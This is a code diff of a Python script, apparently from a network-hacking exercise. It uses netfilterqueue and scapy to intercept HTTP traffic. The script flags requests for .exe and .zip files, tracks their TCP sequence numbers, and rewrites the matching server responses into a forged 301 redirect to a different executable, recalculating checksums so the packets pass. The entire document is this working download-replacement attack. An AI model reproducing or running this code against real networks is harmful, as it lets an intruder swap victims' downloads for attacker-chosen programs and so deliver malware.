@@ -3,36 +3,42 @@ import netfilterqueue
 import scapy.all as scapy
 from scapy.layers.l2 import *
 
-scapy.conf.verb = 0
+ack_list = []
 
+def set_load(packet, url):
+    packet[scapy.Raw].load = url
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 def process_packet(packet):
     # convert packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
-    # when you request and send a file, it goes through the HTTP layer
-    # we then need to classify requests and responses
-    # http data will be in raw layer
     if scapy_packet.haslayer(scapy.Raw):
-        #http requests leave on port 80
-        if scapy_packet.haslayer(scapy.TCP):
-            if scapy_packet[scapy.TCP].dport == 80:
-                # print("[+]HTTP Request")
-                load = scapy_packet[scapy.Raw].load
-                keywords = [".zip", ".ZIP", ".exe", ".EXE"]
-                for keyword in keywords:
-                    if keyword in str(load):
-                        print("[+]EXE or ZIP Request")
-                        print(scapy_packet.show())
-            elif scapy_packet[scapy.TCP].sport == 80:
-                print("[+]HTTP Response")
+        # http data is in the raw layer
+        # if the destination port is 80, its a request
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+]HTTP REQUEST")
+            load = scapy_packet[scapy.Raw].load
+            keywords = [".zip", ".ZIP", ".exe", ".EXE"]
+            for keyword in keywords:
+                if keyword in str(load):
+                    print("[+]EXE or ZIP Request")
+                    # store the ack/seq from the TCP layer of the http request
+                    ack_list.append(scapy_packet[scapy.TCP].ack)
+                    print(scapy_packet.show())
+        # a packet is leaving via an http port
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+]HTTP Response")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701ca.exe\n\n")
+                packet.set_payload(bytes(modified_packet))
                 print(scapy_packet.show())
 
-
-    # show the packet payload, need to be converted to a scapy packet to manipulate it
-    # forwards the packets with .accept()
     packet.accept()
-    # drop the packet
-    #packet.drop()
 
 
 queue = netfilterqueue.NetfilterQueue()
